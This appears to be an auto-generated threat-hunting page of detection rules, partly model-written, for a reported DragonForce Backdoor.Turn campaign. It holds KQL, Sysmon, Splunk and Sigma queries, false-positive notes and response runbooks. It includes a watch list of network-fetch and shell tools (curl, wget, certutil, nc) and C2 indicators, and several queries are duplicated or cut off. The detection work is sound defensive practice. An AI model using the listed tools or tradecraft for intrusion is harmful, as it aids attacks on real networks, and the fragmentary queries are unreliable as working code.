                                   "net.exe","net1.exe","nltest.exe","systeminfo.exe","tasklist.exe","ps",
                                   "curl.exe","curl","wget.exe","wget",
                                   "certutil.exe","bitsadmin.exe",
                                   "nc","ncat","ncat.exe",
                                   "schtasks.exe","at.exe","reg.exe",
                                   "rundll32.exe","regsvr32.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] PowerShell drops 'tech support hotfix' ZIP archive (DragonForce Backdoor.Turn delivery) · Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Article-specific behavioural hunt — DragonForce Hackers Abuse Microsoft Teams Relays to Hide Backdoor.Turn C2 Traffi
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Bring-Your-Own-Vulnerable-Driver load (HWAuidoOs2Ec.sys + DragonForce BYOVD set) · [LLM] Backdoor.Turn injection - CreateRemoteThread / process access targeting DbgView64.exe · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Backdoor.Turn - DbgView64.exe initiating outbound network connection · [LLM] DragonForce Backdoor.Turn - Known C2 IOC contact (IP/domain/SHA256) · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
PowerShell drops 'tech support hotfix' ZIP archive (DragonForce Backdoor.Turn delivery) AIDelivery Medium
Hunts the initial DragonForce delivery step where a PowerShell command pulls down a ZIP archive masqueraded as a tech-support hotfix. The ZIP then stages a signed binary plus a malicious side-load DLL, so catching the drop itself prevents the side-load chain. Rationale: Article states the December 2025 intrusion began with 'a PowerShell command to drop a ZIP archive under the pretext of a tech support hotfix'. Combining PowerShell + download cmdlet + .zip + hotfix-lure keywords yields high specificity for this campaign. Cross-checked against: • https://attack.mitre.org/techniques/T1105/ • https://thehackernews.com/2026/06/dragonforce-hackers-abuse-microsoft.html
ATT&CKT1059.001 T1105 T1036.005
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate IT helpdesk staging real hotfix ZIPs via PowerShell scripts
  • Patch-management tooling (SCCM scripts, Intune Win32 wrappers) using PS to fetch update bundles
  • Developers downloading hotfix-named release ZIPs from GitHub via PowerShell
  • Software auto-updaters whose installer naming includes 'patch'/'update'
Suppression filter
and not (InitiatingProcessFileName in~ ("ccmexec.exe","intunemanagementextension.exe","chocolatey.exe","choco.exe") or InitiatingProcessFolderPath has @"\Program Files\WindowsApps\")
Response runbook
1) Triage: extract URL/host from ProcessCommandLine; resolve domain/IP against TI, sandbox the ZIP via SHA256 from DeviceFileEvents, identify the invoking user/parent (svc account vs human, scheduled task vs Outlook). 2) Contain: isolate device via Defender Live Response, block the source URL/IP at the proxy, kill PowerShell session, quarantine the dropped ZIP and any DLLs extracted from it. 3) Hunt: pivot on dropped ZIP SHA256 across the fleet, look for subsequent rundll32/regsvr32 launching DLLs out of the extracted folder (DLL side-load), scan for HWAuidoOs2Ec.sys driver writes, and review egress to known DragonForce C2 IPs (62.164.177.25, 192.36.27.51).

| where ProcessCommandLine has ".zip"
| where ProcessCommandLine has_any ("hotfix","support","techsupport","patch","update","kb")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc

Bring-Your-Own-Vulnerable-Driver load (HWAuidoOs2Ec.sys + DragonForce BYOVD set) AIInstallation Medium
Hunts for installation/load of the specific vulnerable drivers DragonForce used to silence EDR before deploying Backdoor.Turn: Huawei HWAuidoOs2Ec.sys plus wsftprm.sys (CVE-2023-52271), GameDriverX64.sys (CVE-2025-61155), K7RKScan.sys (CVE-2025-1055) and ABYSSWORKER. Filename-pivoted because the driver names themselves are the article's strongest IOC. Rationale: Article explicitly names HWAuidoOs2Ec.sys (Huawei driver) and provides the BYOVD CVE-paired set (CVE-2023-52271/wsftprm.sys, CVE-2025-61155/GameDriverX64.sys, CVE-2025-1055/K7RKScan.sys) plus ABYSSWORKER. Driver filenames are extremely rare in benign telemetry — high-fidelity pivot. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2023-52271 • https://www.loldrivers.io/ • https://attack.mitre.org/techniques/T1068/
ATT&CKT1068 T1562.001 T1014
Data sourcesEndpoint.Filesystem Endpoint.Registry
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Huawei audio driver installation on Huawei laptops (HWAuidoOs2Ec.sys)
  • K7 Computing AV product legitimately loading K7RKScan.sys
  • WS_FTP Pro legitimate installer dropping wsftprm.sys
  • Red-team / purple-team exercises staging known LOLDrivers
Suppression filter
| where not (InitiatingProcessFolderPath has_any (@"\Program Files\Huawei\", @"\Program Files\K7 Computing\", @"\Program Files (x86)\Ipswitch\WS_FTP\"))
Response runbook
1) Triage: confirm which driver fired, capture SHA256, check if the host has a legitimate vendor match (e.g. Huawei hardware for HWAuidoOs2Ec.sys); pull the dropping process tree and registry service-create events. 2) Contain: isolate host, stop & disable the driver service, quarantine the .sys file, force a Defender scan; revoke any cached creds since BYOVD precedes credential theft in this chain. 3) Hunt: search the fleet for the same SHA256, look for DbgView64.exe injection events that follow within 24h (Backdoor.Turn signature), and check outbound QUIC traffic from DbgView64.exe to non-Microsoft IPs.
let BYOVDFiles = dynamic(["HWAuidoOs2Ec.sys","wsftprm.sys","GameDriverX64.sys","K7RKScan.sys","abyssworker.sys"]);
let BYOVDHashes = dynamic(["82b37a92589dfd4d67ca87eb9e52ac8e682e8e60d2211f59074cd5ccc693013b","821da79d727351dd67ce5df7950e9a3de6647a3cf474bb3a093f67507fed92a6","b6628d201c2a68d2a3de2a87de7a5acfe21b101a97928e1c8d5c82102d967383"]);
union
(DeviceFileEvents
  | where Timestamp > ago(30d)
  | where ActionType in ("FileCreated","FileModified","FileRenamed")
  | where FileName in~ (BYOVDFiles) or SHA256 in (BYOVDHashes)
  | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, Source="FileEvent"),
(DeviceImageLoadEvents
  | where Timestamp > ago(30d)
  | where FileName in~ (BYOVDFiles) or SHA256 in (BYOVDHashes)
  | project Timestamp, DeviceName, ActionType="ImageLoad", FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName=InitiatingProcessAccountName, Source="ImageLoad"),
(DeviceRegistryEvents
  | where Timestamp > ago(30d)
  | where RegistryKey has @"\SYSTEM\CurrentControlSet\Services\"
  | where RegistryValueData has_any (BYOVDFiles)
  | project Timestamp, DeviceName, ActionType, FileName=RegistryValueName, FolderPath=RegistryKey, SHA256="", InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, Source="RegistryService")
| order by Timestamp desc
let BYOVDFiles = dynamic(["HWAuidoOs2Ec.sys","wsftprm.sys","GameDriverX64.sys","K7RKScan.sys","abyssworker.sys"]);
let BYOVDHashes = dynamic(["82b37a92589dfd4d67ca87eb9e52ac8e682e8e60d2211f59074cd5ccc693013b","821da79d727351dd67ce5df7950e9a3de6647a3cf474bb3a093f67507fed92a6","b6628d201c2a68d2a3de2a87de7a5acfe21b101a97928e1c8d5c82102d967383"]);
union
(ImFileEvent
  | where TimeGenerated > ago(30d)
  | where TargetFileName in~ (BYOVDFiles) or TargetFileSHA256 in (BYOVDHashes)
  | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFileName, TargetFilePath, TargetFileSHA256, Source="ImFileEvent"),
(ImRegistryEvent
  | where TimeGenerated > ago(30d)
  | where RegistryKey has @"\SYSTEM\CurrentControlSet\Services\"
  | where RegistryValueData has_any (BYOVDFiles)
  | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFileName=RegistryValueData, TargetFilePath=RegistryKey, TargetFileSHA256="", Source="ImRegistryEvent")
| order by TimeGenerated desc

Backdoor.Turn injection - CreateRemoteThread / process access targeting DbgView64.exe AIInstallation High
Hunts the DragonForce-specific tradecraft of injecting Backdoor.Turn into the legitimate Sysinternals DbgView64.exe process after ransomware deployment. The article calls out DbgView64.exe by name as the target host process — a very rare injection target in benign telemetry. Rationale: Article uniquely names DbgView64.exe as the legitimate Sysinternals host process Backdoor.Turn is injected into after DragonForce ransomware deploys. Sysinternals DbgView64.exe is rare in production EDR data and is almost never the target of remote-thread injection - high-precision pivot. Cross-checked against: • https://thehackernews.com/2026/06/dragonforce-hackers-abuse-microsoft.html • https://attack.mitre.org/techniques/T1055/ • https://learn.microsoft.com/sysinternals/downloads/debugview
ATT&CKT1055 T1055.002 T1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer using Sysinternals DebugView attaching legitimately to processes for triage
  • EDR or AV product tagging DbgView64.exe with self-injection telemetry
  • Red-team C2 framework using DbgView64.exe as host process during sanctioned engagement
  • ProcExp/ProcMon performing handle enumeration that triggers OpenProcessApiCall
Suppression filter
| where InitiatingProcessFolderPath !has @"\Sysinternals\" and InitiatingProcessFileName !in~ ("procexp64.exe","procmon64.exe","MsMpEng.exe")
Response runbook
1) Triage: identify the injecting process (SourceImage), pull its SHA256/path and command line, confirm whether DbgView64.exe is in a non-standard folder (e.g. ProgramData, AppData) which alone is highly suspicious. 2) Contain: isolate the host via EDR live-response, dump DbgView64.exe memory for IR (look for QUIC/TURN strings), kill the process, block C2 IPs 62.164.177.25 / 192.36.27.51 at egress. 3) Hunt: search the fleet for any DbgView64.exe outbound to UDP/443, look for the BYOVD driver writes that preceded it (HWAuidoOs2Ec.sys etc.), and review prior DragonForce ransomware encryption activity within the last 60 days on the host.
// Inject-into-DbgView64.exe — CreateRemoteThread / OpenProcess on the article's named target
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType in ("CreateRemoteThreadApiCall","OpenProcessApiCall","ProcessPrimaryTokenModified","WriteToLsassProcessMemory")
| extend TargetImage = tostring(parse_json(AdditionalFields).TargetImage),
         TargetFileName_x = tostring(parse_json(AdditionalFields).TargetFileName)
| where FileName =~ "DbgView64.exe" or TargetImage endswith @"\DbgView64.exe" or TargetFileName_x =~ "DbgView64.exe"
| where InitiatingProcessFileName !~ "DbgView64.exe"
| project Timestamp, DeviceName, ActionType, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessSHA256, TargetImage, AdditionalFields
| order by Timestamp desc
// Sysmon EID 8 (CreateRemoteThread) / EID 10 (ProcessAccess) targeting DbgView64.exe
WindowsEvent
| where TimeGenerated > ago(30d)
| where Provider == "Microsoft-Windows-Sysmon"
| where EventID in (8, 10)
| extend TargetImage = tostring(EventData.TargetImage),
         SourceImage = tostring(EventData.SourceImage),
         GrantedAccess = tostring(EventData.GrantedAccess),
         CallTrace = tostring(EventData.CallTrace)
| where TargetImage endswith "\\DbgView64.exe"
| where SourceImage !endswith "\\DbgView64.exe"
| where SourceImage !endswith "\\explorer.exe" and SourceImage !endswith "\\services.exe"
| project TimeGenerated, Computer, EventID, SourceImage, TargetImage, GrantedAccess, CallTrace
| order by TimeGenerated desc
title: Process Injection Targeting Sysinternals DbgView64.exe (DragonForce Backdoor.Turn)

Backdoor.Turn - DbgView64.exe initiating outbound network connection AICommand & Control High
Hunts DbgView64.exe — the Sysinternals tool the article confirms is hijacked as host process for Backdoor.Turn — making outbound network connections. Sysinternals DebugView is a local diagnostic tool and should never speak to the internet, especially via QUIC/UDP 443 to non-Microsoft destinations. Rationale: DebugView (DbgView64.exe) is a Sysinternals diagnostic utility that does not require network connectivity. Article confirms DragonForce uses it as host process for Backdoor.Turn QUIC C2 — any outbound from this binary is high-fidelity. Cross-checked against: • https://thehackernews.com/2026/06/dragonforce-hackers-abuse-microsoft.html • https://learn.microsoft.com/sysinternals/downloads/debugview • https://www.praetorian.com/blog/ghost-calls-c2-microsoft-teams-turn/
ATT&CKT1071.001 T1090.002 T1572
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer using DebugView with network-aware sister tools — extremely rare
  • Sysinternals Live (live.sysinternals.com) update check by genuine DbgView (uses HTTPS/TCP 443 to Microsoft IP space — distinguish by destination)
  • Red-team / purple-team exercise simulating Backdoor.Turn
  • EDR/AV process tagging where DbgView64 telemetry gets attributed to a wrapper
Suppression filter
| where not (RemoteIP startswith "13." or RemoteIP startswith "20." or RemoteIP startswith "40." or RemoteIP startswith "52.")  // exclude Microsoft AS8075 ranges (rough)
Response runbook
1) Triage: validate the destination IP/ASN (DragonForce IPs include 62.164.177.25 and 192.36.27.51; Microsoft Teams TURN egress should resolve to Microsoft AS8075). Pull file path of DbgView64.exe — anywhere outside an admin's tools folder is suspect. 2) Contain: isolate host via Defender, kill the DbgView64.exe process, block the remote IP at firewall, capture process memory before kill if forensics-ready. 3) Hunt: pivot on the remote IP across the fleet, search for any other Sysinternals binary making outbound (procexp64.exe, procmon64.exe), check for the BYOVD driver writes that preceded this connection, and review whether any DragonForce ransomware encryption activity was observed on the host in the last 90 days.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "DbgView64.exe"
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol, InitiatingProcessAccountName
| order by Timestamp desc
// Sysmon EID 3 — network connection initiated by DbgView64.exe (parsed from EventData)
WindowsEvent
| where TimeGenerated > ago(30d)
| where Provider == "Microsoft-Windows-Sysmon" and EventID == 3
| extend Image = tostring(EventData.Image),
         DestIp = tostring(EventData.DestinationIp),
         DestPort = toint(EventData.DestinationPort),
         NetProtocol = tostring(EventData.Protocol),
         DestHostname = tostring(EventData.DestinationHostname)
| where Image endswith "\\DbgView64.exe"
| project TimeGenerated, Computer, Image, DestIp, DestPort, NetProtocol, DestHostname
| order by TimeGenerated desc

DragonForce Backdoor.Turn - Known C2 IOC contact (IP/domain/SHA256) AICommand & Control Medium
Pure IOC sweep on the DragonForce/Backdoor.Turn campaign indicators released in the Symantec/Carbon Black write-up: two C2 IPs, eight C2 domains, and 20 SHA256 hashes. Runs across network/DNS/file telemetry for known contact. Rationale: Pre-extracted IOC list from the Symantec/Carbon Black write-up of DragonForce Backdoor.Turn: 2 C2 IPs (62.164.177.25, 192.36.27.51), 8 C2 domains, and 20 SHA256 hashes. Pure IOC sweep across network/DNS/file telemetry — Sigma intentionally skipped because this is a multi-table union, not single-event-shape. Cross-checked against: • https://thehackernews.com/2026/06/dragonforce-hackers-abuse-microsoft.html • https://www.symantec-enterprise-blogs.security.com/blogs/threat-intelligence • https://www.praetorian.com/blog/ghost-calls-c2-microsoft-teams-turn/
ATT&CKT1071.001 T1105
Data sourcesEndpoint.Filesystem Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel feed scanner / IOC sweeper hitting these domains intentionally
  • Researcher visiting compromised-but-cleaned domain (e.g. glanz-gmbh.de after takedown)
  • Sandbox detonation of related sample inside the corporate network
  • CDN/shared-hosting collision where benign sites share an IP with a former C2 IP
Response runbook
1) Triage: identify the host/user that contacted the IOC, determine the initiating process and binary (look specifically for DbgView64.exe per the campaign signature), validate this isn't a TI scanner or sandbox host. 2) Contain: isolate the host via EDR, block the IPs/domains/hashes at egress proxy + DNS, quarantine any matching SHA256 files, force credential reset for the account if interactive logon occurred. 3) Hunt: timeline 60-90 days backward looking for the December 2025 entry technique (PowerShell ZIP hotfix), BYOVD driver writes (HWAuidoOs2Ec.sys), DLL side-loading, lateral movement (LDAP enumeration is a Backdoor.Turn capability), and any DragonForce ransomware staging activity.

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`

| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |

    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:

author: Clankerusecase
date: 2026/05/02
tags:

    product: windows
detection:

            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
